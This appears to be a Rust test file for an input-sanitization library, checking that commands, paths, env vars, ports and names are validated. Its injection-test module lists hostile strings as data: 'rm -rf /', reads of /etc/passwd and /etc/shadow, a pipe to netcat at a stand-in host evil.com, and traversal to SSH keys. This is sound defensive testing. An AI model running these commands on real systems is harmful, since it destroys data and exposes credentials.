//! Comprehensive tests including property-based testing with proptest.

use crate::*;
use proptest::prelude::*;

// =============================================================================
// Property-based tests with proptest
// =============================================================================

proptest! {
    #![proptest_config(ProptestConfig::with_cases(1000))]

    // -------------------------------------------------------------------------
    // Node name tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_node_names_always_pass(
        name in "[a-zA-Z][a-zA-Z0-9_-]{0,63}"
    ) {
        prop_assert!(sanitize_node_name(&name).is_ok());
    }

    #[test]
    fn prop_node_names_with_invalid_chars_fail(
        prefix in "[a-zA-Z][a-zA-Z0-9_-]{0,30}",
        invalid in "[^a-zA-Z0-9_-]",
        suffix in "[a-zA-Z0-9_-]{0,30}"
    ) {
        let name = format!("{prefix}{invalid}{suffix}");
        let result = sanitize_node_name(&name);
        // Should fail unless the "invalid" char happens to be valid
        if !invalid.chars().next().map_or(false, |c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
            prop_assert!(result.is_err());
        }
    }

    #[test]
    fn prop_node_names_starting_with_digit_fail(
        first in "[0-9]",
        rest in "[a-zA-Z0-9_-]{0,62}"
    ) {
        let name = format!("{first}{rest}");
        prop_assert!(sanitize_node_name(&name).is_err());
    }

    #[test]
    fn prop_node_names_over_64_chars_fail(
        name in "[a-zA-Z][a-zA-Z0-9_-]{64,128}"
    ) {
        prop_assert!(sanitize_node_name(&name).is_err());
    }

    // -------------------------------------------------------------------------
    // Job ID (UUID) tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_uuids_pass(
        a in "[0-9a-f]{8}",
        b in "[0-9a-f]{4}",
        c in "[0-9a-f]{4}",
        d in "[0-9a-f]{4}",
        e in "[0-9a-f]{12}"
    ) {
        let uuid = format!("{a}-{b}-{c}-{d}-{e}");
        prop_assert!(sanitize_job_id(&uuid).is_ok());
    }

    #[test]
    fn prop_invalid_uuid_formats_fail(
        s in "[a-z0-9]{1,36}"
    ) {
        // Most random alphanumeric strings won't be valid UUIDs
        // Only exact format passes
        if !s.contains('-') || s.len() != 36 {
            // Skip strings that happen to look like UUIDs
            let result = sanitize_job_id(&s);
            // Not guaranteed to fail, but likely
            let _ = result;
        }
    }

    // -------------------------------------------------------------------------
    // Command sanitization tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_commands_with_semicolon_fail(
        prefix in "[a-zA-Z0-9 ._/-]{0,100}",
        suffix in "[a-zA-Z0-9 ._/-]{0,100}"
    ) {
        let cmd = format!("{prefix};{suffix}");
        let result = sanitize_command(&cmd);
        prop_assert!(result.is_err());
        if let Err(e) = result {
            prop_assert!(e.is_security_error());
        }
    }

    #[test]
    fn prop_commands_with_pipe_fail(
        prefix in "[a-zA-Z0-9 ._/-]{0,100}",
        suffix in "[a-zA-Z0-9 ._/-]{0,100}"
    ) {
        let cmd = format!("{prefix}|{suffix}");
        let result = sanitize_command(&cmd);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_commands_with_dollar_fail(
        prefix in "[a-zA-Z0-9 ._/-]{0,100}",
        var in "[A-Z_]{1,20}"
    ) {
        let cmd = format!("{prefix}${var}");
        let result = sanitize_command(&cmd);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_commands_with_backtick_fail(
        prefix in "[a-zA-Z0-9 ._/-]{0,100}",
        inner in "[a-zA-Z0-9 ]{0,50}",
    ) {
        let cmd = format!("{prefix}`{inner}`");
        let result = sanitize_command(&cmd);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_safe_commands_pass(
        cmd in "[a-zA-Z0-9 ._/=-]{1,100}"
    ) {
        // Commands without metacharacters should pass
        let result = sanitize_command(&cmd);
        prop_assert!(result.is_ok());
    }

    // -------------------------------------------------------------------------
    // Path sanitization tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_paths_with_traversal_fail(
        prefix in "[a-zA-Z0-9_/]{0,50}",
        suffix in "[a-zA-Z0-9_/]{0,50}"
    ) {
        let path = format!("{prefix}/../{suffix}");
        let result = sanitize_path(&path, false);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_absolute_paths_fail_when_disallowed(
        path in "/[a-zA-Z0-9_/]{1,100}"
    ) {
        let result = sanitize_path(&path, false);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_absolute_paths_pass_when_allowed(
        path in "/[a-zA-Z0-9_/]{1,100}"
    ) {
        let result = sanitize_path(&path, true);
        prop_assert!(result.is_ok());
    }

    #[test]
    fn prop_relative_paths_pass(
        path in "[a-zA-Z0-9_][a-zA-Z0-9_/]{0,100}"
    ) {
        // Relative paths without traversal should pass
        if !path.contains("..") {
            let result = sanitize_path(&path, false);
            prop_assert!(result.is_ok());
        }
    }

    // -------------------------------------------------------------------------
    // Environment variable tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_env_keys_pass(
        key in "[a-zA-Z_][a-zA-Z0-9_]{0,100}",
        value in "[a-zA-Z0-9 ._/-]{0,1000}"
    ) {
        let result = sanitize_env_var(&key, &value);
        prop_assert!(result.is_ok());
    }

    #[test]
    fn prop_env_keys_starting_with_digit_fail(
        first in "[0-9]",
        rest in "[a-zA-Z0-9_]{0,50}",
        value in "[a-zA-Z0-9]{0,100}"
    ) {
        let key = format!("{first}{rest}");
        let result = sanitize_env_var(&key, &value);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_env_values_with_null_fail(
        key in "[A-Z_]{1,20}",
        prefix in "[a-zA-Z0-9]{0,50}",
        suffix in "[a-zA-Z0-9]{0,50}"
    ) {
        let value = format!("{prefix}\0{suffix}");
        let result = sanitize_env_var(&key, &value);
        prop_assert!(result.is_err());
    }

    // -------------------------------------------------------------------------
    // Port validation tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_ports_pass(port in 1u32..=65535u32) {
        let result = validate_port(port);
        prop_assert!(result.is_ok());
        prop_assert_eq!(result.unwrap().value(), port as u16);
    }

    #[test]
    fn prop_invalid_ports_fail(port in 65536u32..=100000u32) {
        let result = validate_port(port);
        prop_assert!(result.is_err());
    }

    #[test]
    fn prop_privileged_ports_require_permission(port in 1u32..=1023u32) {
        // Without permission, should fail
        prop_assert!(crate::numeric::validate_port_with_privilege(port, false).is_err());
        // With permission, should pass
        prop_assert!(crate::numeric::validate_port_with_privilege(port, true).is_ok());
    }

    // -------------------------------------------------------------------------
    // Memory limit tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_memory_limits_pass(
        mib in 1u64..=1024u64 * 1024  // 1 MiB to 1 TiB
    ) {
        let bytes = mib * 1024 * 1024;
        let result = validate_memory_limit(bytes);
        prop_assert!(result.is_ok());
    }

    #[test]
    fn prop_small_memory_limits_fail(bytes in 0u64..MIN_MEMORY_LIMIT) {
        let result = validate_memory_limit(bytes);
        prop_assert!(result.is_err());
    }

    // -------------------------------------------------------------------------
    // Timeout tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_valid_timeouts_pass(seconds in 1u64..=MAX_TIMEOUT_SECONDS) {
        let result = validate_timeout(seconds);
        prop_assert!(result.is_ok());
    }

    #[test]
    fn prop_excessive_timeouts_fail(
        seconds in (MAX_TIMEOUT_SECONDS + 1)..=MAX_TIMEOUT_SECONDS * 10
    ) {
        let result = validate_timeout(seconds);
        prop_assert!(result.is_err());
    }

    // -------------------------------------------------------------------------
    // Image name tests
    // -------------------------------------------------------------------------

    #[test]
    fn prop_simple_image_names_pass(
        name in "[a-z][a-z0-9]{2,20}"
    ) {
        let result = sanitize_image_name(&name);
        prop_assert!(result.is_ok());
    }

    #[test]
    fn prop_image_names_with_tag_pass(
        name in "[a-z][a-z0-9]{2,20}",
        tag in "[a-zA-Z0-9][a-zA-Z0-9._-]{0,20}"
    ) {
        let image = format!("{name}:{tag}");
        let result = sanitize_image_name(&image);
        prop_assert!(result.is_ok());
    }
}

// =============================================================================
// Edge case tests
// =============================================================================

mod edge_cases {
    use super::*;

    #[test]
    fn empty_inputs() {
        assert!(sanitize_node_name("").is_err());
        assert!(sanitize_job_id("").is_err());
        assert!(sanitize_image_name("").is_err());
        assert!(sanitize_command("").is_err());
        assert!(sanitize_path("", false).is_err());
        assert!(sanitize_env_var("", "value").is_err());
    }

    #[test]
    fn max_length_boundary() {
        // Exactly at max length
        let max_node = "a".repeat(MAX_NODE_NAME_LENGTH);
        assert!(sanitize_node_name(&max_node).is_ok());

        // One over max length
        let over_max = "a".repeat(MAX_NODE_NAME_LENGTH + 1);
        assert!(sanitize_node_name(&over_max).is_err());
    }

    #[test]
    fn unicode_in_node_names() {
        // Unicode should be rejected
        assert!(sanitize_node_name("nöde").is_err());
        assert!(sanitize_node_name("узел").is_err());
        assert!(sanitize_node_name("节点").is_err());
        assert!(sanitize_node_name("🦀node").is_err());
    }

    #[test]
    fn unicode_in_commands() {
        // Unicode characters themselves aren't dangerous shell metacharacters
        // but control chars are
        assert!(sanitize_command("echo hello").is_ok());
        // Null byte is rejected
        assert!(sanitize_command("echo\0hello").is_err());
    }

    #[test]
    fn whitespace_handling() {
        // Leading/trailing whitespace in node names
        assert!(sanitize_node_name(" node").is_err());
        assert!(sanitize_node_name("node ").is_err());

        // Spaces in commands are fine
        assert!(sanitize_command("echo hello world").is_ok());
    }

    #[test]
    fn special_path_sequences() {
        // Various traversal attempts
        assert!(sanitize_path("..", false).is_err());
        assert!(sanitize_path("../", false).is_err());
        assert!(sanitize_path("a/../b", false).is_err());
        assert!(sanitize_path("a/b/../c", false).is_err());
        assert!(sanitize_path("..\\..\\windows", false).is_err());

        // Current directory reference is ok
        assert!(sanitize_path("./file", false).is_ok());
        assert!(sanitize_path(".", false).is_ok());
    }

    #[test]
    fn port_boundaries() {
        assert!(validate_port(0).is_err());
        assert!(validate_port(1).is_ok());
        assert!(validate_port(65535).is_ok());
        assert!(validate_port(65536).is_err());
    }

    #[test]
    fn memory_boundaries() {
        assert!(validate_memory_limit(MIN_MEMORY_LIMIT - 1).is_err());
        assert!(validate_memory_limit(MIN_MEMORY_LIMIT).is_ok());
        assert!(validate_memory_limit(MAX_MEMORY_LIMIT).is_ok());
        assert!(validate_memory_limit(MAX_MEMORY_LIMIT + 1).is_err());
    }

    #[test]
    fn timeout_boundaries() {
        assert!(validate_timeout(0).is_err());
        assert!(validate_timeout(1).is_ok());
        assert!(validate_timeout(MAX_TIMEOUT_SECONDS).is_ok());
        assert!(validate_timeout(MAX_TIMEOUT_SECONDS + 1).is_err());
    }
}

// =============================================================================
// Injection attempt tests
// =============================================================================

mod injection_attempts {
    use super::*;

    #[test]
    fn command_injection_semicolon() {
        let attacks = [
            "ls; rm -rf /",
            "echo hello; cat /etc/passwd",
            "cmd;cmd2",
            "a;b;c;d",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
            assert!(result.unwrap_err().is_security_error());
        }
    }

    #[test]
    fn command_injection_pipe() {
        let attacks = [
            "cat file | grep secret",
            "echo hello | nc evil.com 1234",
            "a|b",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn command_injection_substitution() {
        let attacks = [
            "echo $(whoami)",
            "$(cat /etc/passwd)",
            "echo `id`",
            "`rm -rf /`",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn command_injection_variable_expansion() {
        let attacks = [
            "echo $HOME",
            "cat $SECRET",
            "export PATH=$PATH:/evil",
            "echo ${HOME}",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn command_injection_redirect() {
        let attacks = [
            "echo secret > /etc/passwd",
            "cat < /etc/shadow",
            "cmd >> logfile",
            "cmd 2>&1",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn command_injection_background() {
        let attacks = [
            "sleep 1000 &",
            "nohup evil &",
            "cmd1 && cmd2",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn command_injection_newline() {
        let attacks = [
            "cmd1\ncmd2",
            "echo hello\r\necho world",
            "cmd\n",
        ];
        for attack in &attacks {
            let result = sanitize_command(attack);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn path_traversal_attacks() {
        let attacks = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "dir/../../../../etc/shadow",
            "subdir/../../../root/.ssh/id_rsa",
            "%2e%2e/%2e%2e/etc/passwd",
        ];
        for attack in &attacks {
            let result = sanitize_path(attack, false);
            assert!(result.is_err(), "Should block: {attack}");
        }
    }

    #[test]
    fn null_byte_injection() {
        // Null byte attacks
        let attacks = [
            ("node\0name", "node_name"),
            ("image\0:tag", "image_name"),
            ("cmd\0arg", "command"),
            ("path/to/file\0.txt", "path"),
        ];
        for (attack, field) in &attacks {
            match *field {
                "node_name" => assert!(sanitize_node_name(attack).is_err()),
                "image_name" => assert!(sanitize_image_name(attack).is_err()),
                "command" => assert!(sanitize_command(attack).is_err()),
                "path" => assert!(sanitize_path(attack, false).is_err()),
                _ => {}
            }
        }
    }

    #[test]
    fn env_var_injection() {
        // Dangerous env var keys
        let bad_keys = [
            "VAR=VALUE",      // Contains =
            "VAR\0NAME",      // Contains null
            "123VAR",         // Starts with digit
            "VAR NAME",       // Contains space
            "VAR-NAME",       // Contains dash
        ];
        for key in &bad_keys {
            assert!(sanitize_env_var(key, "value").is_err(), "Should block key: {key}");
        }

        // Null in value should fail
        assert!(sanitize_env_var("VAR", "value\0with\0nulls").is_err());
    }

    #[test]
    fn image_name_injection() {
        // Path traversal in image names
        assert!(sanitize_image_name("../evil").is_err());
        assert!(sanitize_image_name("registry/../../../etc").is_err());
    }
}

// =============================================================================
// Builder pattern tests
// =============================================================================

mod builder_tests {
    use super::*;
    use crate::builder::{NumericValidationBuilder, ValidationBuilder};

    #[test]
    fn builder_comprehensive_validation() {
        // Valid username
        let result = ValidationBuilder::new("username", "john_doe123")
            .not_empty()
            .min_length(3)
            .max_length(32)
            .alphanumeric_with("_")
            .starts_with_letter()
            .no_null_bytes()
            .build();

        assert!(result.is_ok());

        // Invalid username - starts with number
        let result = ValidationBuilder::new("username", "123john")
            .not_empty()
            .starts_with_letter()
            .build();

        assert!(result.is_err());
    }

    #[test]
    fn numeric_builder_chained() {
        // Valid port
        let result = NumericValidationBuilder::new("port", 8080)
            .non_zero()
            .range(1, 65535)
            .build();

        assert!(result.is_ok());
        assert_eq!(result.unwrap().value(), 8080);

        // Invalid - zero
        let result = NumericValidationBuilder::new("port", 0)
            .non_zero()
            .build();

        assert!(result.is_err());
    }

    #[test]
    fn builder_with_all_errors() {
        let result = ValidationBuilder::new("field", "")
            .collect_all_errors()
            .not_empty()
            .min_length(5)
            .starts_with_letter()
            .build_with_all_errors();

        match result {
            Err(errors) => {
                // Should have multiple errors
                assert!(!errors.is_empty());
            }
            Ok(_) => panic!("Expected validation errors"),
        }
    }

    #[test]
    fn builder_custom_validator() {
        let result = ValidationBuilder::new("hostname", "example.com")
            .not_empty()
            .custom(|s| {
                if s.contains('.') {
                    Ok(())
                } else {
                    Err(ValidationError::invalid_format(
                        "hostname",
                        "must contain a dot",
                        s,
                    ))
                }
            })
            .build();

        assert!(result.is_ok());

        let result = ValidationBuilder::new("hostname", "localhost")
            .custom(|s| {
                if s.contains('.') {
                    Ok(())
                } else {
                    Err(ValidationError::invalid_format(
                        "hostname",
                        "must contain a dot",
                        s,
                    ))
                }
            })
            .build();

        assert!(result.is_err());
    }
}

// =============================================================================
// Sanitized wrapper tests
// =============================================================================

mod sanitized_tests {
    use super::*;

    #[test]
    fn sanitized_type_safety() {
        // Can't create Sanitized directly from untrusted input
        // Must go through validation functions

        let validated = sanitize_node_name("valid-node").unwrap();

        // Can convert to inner type
        let s: String = validated.into_inner();
        assert_eq!(s, "valid-node");
    }

    #[test]
    fn sanitized_port_conversion() {
        let port = validate_port(8080).unwrap();

        // Can use as u16
        let port_num: u16 = port.into();
        assert_eq!(port_num, 8080);

        // Or get value
        assert_eq!(port.value(), 8080);
    }

    #[test]
    fn sanitized_deref() {
        let name = sanitize_node_name("my-node").unwrap();

        // Deref coercion works
        assert!(name.starts_with("my"));
        assert_eq!(name.len(), 7);
    }

    #[test]
    fn sanitized_display() {
        let name = sanitize_node_name("my-node").unwrap();
        assert_eq!(format!("{name}"), "my-node");
    }
}
